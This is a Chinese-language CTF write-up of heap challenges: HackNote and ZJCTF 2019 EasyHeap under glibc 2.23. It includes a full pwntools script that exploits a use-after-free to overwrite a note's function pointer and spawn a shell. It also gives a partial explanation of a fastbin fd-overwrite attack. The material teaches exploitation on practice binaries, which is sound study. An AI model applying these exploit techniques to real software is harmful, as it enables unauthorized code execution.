---
title: "1.UAF"
date: 2026-11-13 19:08:04
categories:
  - "题目复现"
  - "ZJCTF"
tags: ["fastbin", "unsorted-bin", "UAF", "glibc2.23"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#1 -->
## 1.HackNote

![image-20260904172026686](/pwn-notes/images/notes/image-20260904172026686.png)

菜单然后就是，查看各自的功能，于是在delete中发现

![image-20260904172133477](/pwn-notes/images/notes/image-20260904172133477.png)

free后并没有进行指针清零，后面还有一个函数是print函数，于是这个时候在新建完两条笔记再次删除之后，

比如新建A B 之后删除 在bin里就会组成链表

B->A

这时如果再次新建笔记，就会从bin里面找出B之后，我们编辑的时候就可以修改里面的内容，就是相当于修改原来A里内容，改成后门函数之后，再次打印A这个时候就会触发后门函数。

模拟创建函数，模拟其中的函数实现流程

比如说就是创建add函数

![image-20260904173754763](/pwn-notes/images/notes/image-20260904173754763.png)

![image-20260904174505089](/pwn-notes/images/notes/image-20260904174505089.png)

选择fastbin的优点：

![image-20260904175323271](/pwn-notes/images/notes/image-20260904175323271.png)

而0x80再加上头部之后就会超过fastbin的大小范围，就会进入unsortedebin，于是

![image-20260904180045350](/pwn-notes/images/notes/image-20260904180045350.png)

所以只需要删除两个之后再次添加一个fastbin之后，就会指向A的fastbin这个时候再去修改函数就可以

str(size).encode();

输入的是0x80，这个时候str输出的是10进制之后.encode()把字符串转换成字节串

![image-20260904182233859](/pwn-notes/images/notes/image-20260904182233859.png)

```python
from pwn import *

# ========== 环境设置 ==========
context(arch='i386', os='linux', log_level='debug')

# ========== 连接方式 ==========
# 本地调试
io = process('./hacknote')
# 远程打靶（替换成实际IP和端口）
# io = remote('ip', port)

# ========== 后门函数地址（从IDA获取） ==========
magic_addr = 0x804896b

# ========== 辅助函数 ==========
def add(size, content):
    """新建笔记：选1 → 输入size → 输入content"""
    io.sendlineafter(b'choice :', b'1')
    io.sendlineafter(b'size :', str(size).encode())
    io.sendafter(b'Content :', content)

def delete(index):
    """删除笔记：选2 → 输入index"""
    io.sendlineafter(b'choice :', b'2')
    io.sendlineafter(b'Index :', str(index).encode())

def show(index):
    """查看笔记：选3 → 输入index"""
    io.sendlineafter(b'choice :', b'3')
    io.sendlineafter(b'Index :', str(index).encode())

# ========== Step 1: 新建两条笔记 ==========
# content大小选0x80，让content进unsortedbin，不干扰fastbin[0]
add(0x80, b'aaaa')      # 笔记0: 结构体A(8B) + content_a(0x80B)
add(0x80, b'bbbb')      # 笔记1: 结构体B(8B) + content_b(0x80B)

# ========== Step 2: 删除两条笔记（触发UAF） ==========
# free后 notelist[0]还指向A，notelist[1]还指向B（没清空！）
# fastbin[0]: 结构体B → 结构体A → NULL（LIFO后进先出）
delete(0)
delete(1)

# ========== Step 3: 新建笔记2，覆盖笔记0的函数指针 ==========
# add_note内部两次malloc(8):
#   第1次malloc(8) → 从fastbin[0]拿 → 结构体B → 当笔记2的结构体
#   第2次malloc(8) → 从fastbin[0]拿 → 结构体A → 当笔记2的内容区！
# 往笔记2的内容区写magic_addr = 往结构体A写magic_addr
# = 覆盖笔记0结构体偏移0的函数指针！
add(8, p32(magic_addr))

# ========== Step 4: 查看笔记0，触发后门 ==========
# print_note(0):
#   1. 读notelist[0] → 指向A（没清空，还能找到）
#   2. 读A偏移0 → magic_addr（被我们覆盖了）
#   3. 跳转到magic_addr执行
#   4. magic() → system("/bin/sh") → getshell！
show(0)

# ========== 交互模式 ==========
io.interactive()
```

## 2.**[ZJCTF 2019]EasyHeap**

![image-20260904182949488](/pwn-notes/images/notes/image-20260904182949488.png)

后门函数

![image-20260904183008799](/pwn-notes/images/notes/image-20260904183008799.png)

菜单题

![image-20260904183109295](/pwn-notes/images/notes/image-20260904183109295.png)

可是这里的delete函数在删完之后就将指针清零











































## pw2

首先改一下看一下

libc库是就是函数库，而ld文件是来进行连接看调用哪个版本的函数库。

![image-20260907184352112](/pwn-notes/images/notes/image-20260907184352112.png)

![image-20260907184630758](/pwn-notes/images/notes/image-20260907184630758.png)

![image-20260907184935247](/pwn-notes/images/notes/image-20260907184935247.png)

那么只需要给它配置一个2.23的就可以。

那么再来复习一下配置文件的步骤

查找对应版本，`list` 就是**纯文本清单文件**，保存所有可下载的 glibc 版本名字。

```shell
cat list
```

找到对应版本进行下载

![image-20260907185442800](/pwn-notes/images/notes/image-20260907185442800.png)

![image-20260907185747172](/pwn-notes/images/notes/image-20260907185747172.png)



![image-20260907190029022](/pwn-notes/images/notes/image-20260907190029022.png)

![image-20260907185858842](/pwn-notes/images/notes/image-20260907185858842.png)





```shell
patchelf --set-interpreter ./ld-2.23.so ./pwn
patchelf --add-needed ./libc-2.23.so ./pwn
```

接下来正式看题

![image-20260907192124497](/pwn-notes/images/notes/image-20260907192124497.png)

菜单题，

add:

![image-20260907192213432](/pwn-notes/images/notes/image-20260907192213432.png)



delete：

![image-20260907192243728](/pwn-notes/images/notes/image-20260907192243728.png)

可以看到这里将指针清零了。





编辑：

![image-20260907192332324](/pwn-notes/images/notes/image-20260907192332324.png)

堆溢出，嗯嗯原来这就是堆溢出

那么之后呢，不知道。哦，对了，还有一个shell函数

但是需要修改东西



![image-20260907192740155](/pwn-notes/images/notes/image-20260907192740155.png)

![image-20260907192650036](/pwn-notes/images/notes/image-20260907192650036.png)

首先就是创建一个堆块

之后再次创建一个堆块，使得释放之后进入fastbin之后

为什么必须是fastbin?

先回忆 fastbin 的核心行为（glibc‑2.23）：

1. fastbin 是**单向链表，只用 fd，没有 bk**。
2. free 进 fastbin 的时候**不做完整性检查**。
3. malloc 从 fastbin 取块的时候：**只校验 size 是否匹配 fastbin 下标，不校验这个 fd 指向的地址是不是真正堆内存**。

编辑chunk1之后堆溢出到chunk2的fd指针，使得这个指针停留在key指针附近，之后再次malloc的时候获取这个堆块就可以，编辑其附近的内容也就是key的内容，修改它的值，可以。

来呗，动调。

key的地址附近情况:

![image-20260907203638230](/pwn-notes/images/notes/image-20260907203638230.png)

<!-- sync-hash: c490f77677faaa648d51e8af1cef1e1e4cfcf26cf7b1acffd9404e8b9e358eee -->
